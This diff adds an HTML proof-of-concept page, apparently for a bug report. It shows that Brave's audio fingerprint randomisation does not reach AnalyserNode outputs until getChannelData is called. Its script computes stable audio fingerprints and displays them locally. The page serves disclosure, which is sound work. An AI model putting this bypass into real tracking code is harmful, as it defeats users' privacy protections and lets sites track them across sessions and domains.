@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Brave AnalyserNode Farbling Bypass PoC</title>
+  <style>
+    table { 
+      border-collapse: collapse; 
+      margin: 20px 0; 
+      min-width: 600px;
+    }
+    td, th { 
+      border: 1px solid black; 
+      padding: 8px 16px; 
+    }
+    caption { 
+      font-weight: bold;
+      font-size: 1.2em;
+      margin: 10px 0;
+    }
+  </style>
+</head>
+<body>
+  <h2>AnalyserNode Fingerprinting Test</h2>
+  <table id="results">
+    <caption>Initial (Unfarbled)</caption>
+    <tr><th>Method</th><th>Fingerprint</th></tr>
+  </table>
+  <table id="results-after">
+    <caption>After getChannelData (Farbled)</caption>
+    <tr><th>Method</th><th>Fingerprint</th></tr>
+  </table>
+
+  <script>
+    // Sum the array values to create a fingerprint
+    // Values will be consistent across sessions/domains if farbling is not working
+    function sumArray(arr) {
+      return arr.reduce((sum, val) => sum + val, 0).toFixed(4);
+    }
+
+    async function analyzeAudio(triggerFarbling = false) {
+      const context = new OfflineAudioContext(1, 44100, 44100);
+      
+      // The call to getChannelData triggers the initialization of BraveAudioFarblingHelper
+      // Without this, the AnalyserNode methods below will return unfarbled data.
+      // copyFromChannel can also be used with the same effect, as both trigger
+      // BraveSessionCache::FarbleAudioChannel, which initializes BraveAudioFarblingHelper 
+      if (triggerFarbling) {
+        const context2 = new OfflineAudioContext(1, 44100, 44100); // note that any context can be used
+        const buffer = await context2.startRendering();
+        buffer.getChannelData(0); // don't need to do anything with the data
+      }
+
+      const osc1 = context.createOscillator();
+      const osc2 = context.createOscillator();
+      const gain = context.createGain();
+
+      osc1.type = 'sawtooth';
+      osc1.frequency.value = 440;
+      
+      osc2.type = 'square';
+      osc2.frequency.value = 444; // slight detune to create more complex harmonics
+
+      gain.gain.value = 0.5;
+
+      const analyser = context.createAnalyser();
+      analyser.fftSize = 256;
+
+      osc1.connect(gain);
+      osc2.connect(gain);
+      gain.connect(analyser);
+      analyser.connect(context.destination);
+
+      osc1.start();
+      osc2.start();
+      await context.startRendering();
+
+      // These AnalyserNode methods should return farbled data
+      // But they will return consistent (unfarbled) values until getChannelData or copyFromChannel are called
+      const floatFreq = new Float32Array(analyser.frequencyBinCount);
+      const byteFreq = new Uint8Array(analyser.frequencyBinCount);
+      const floatTime = new Float32Array(analyser.frequencyBinCount);
+      const byteTime = new Uint8Array(analyser.frequencyBinCount);
+
+      analyser.getFloatFrequencyData(floatFreq);
+      analyser.getByteFrequencyData(byteFreq);
+      analyser.getFloatTimeDomainData(floatTime);
+      analyser.getByteTimeDomainData(byteTime);
+
+      return [
+        {name: 'getFloatFrequencyData', sum: sumArray(floatFreq)},
+        {name: 'getByteFrequencyData', sum: sumArray(byteFreq)},
+        {name: 'getFloatTimeDomainData', sum: sumArray(floatTime)},
+        {name: 'getByteTimeDomainData', sum: sumArray(byteTime)}
+      ];
+    }
+
+    async function runTest() {
+      for (const [tableId, useFarbling] of [['results', false], ['results-after', true]]) {
+        const results = await analyzeAudio(useFarbling);
+        const table = document.getElementById(tableId);
+        results.forEach(result => {
+          const row = table.insertRow();
+          row.innerHTML = `<td>${result.name}</td><td>${result.sum}</td>`;
+        });
+      }
+    }
+
+    runTest();
+    
+  </script>
+</body>
+</html>
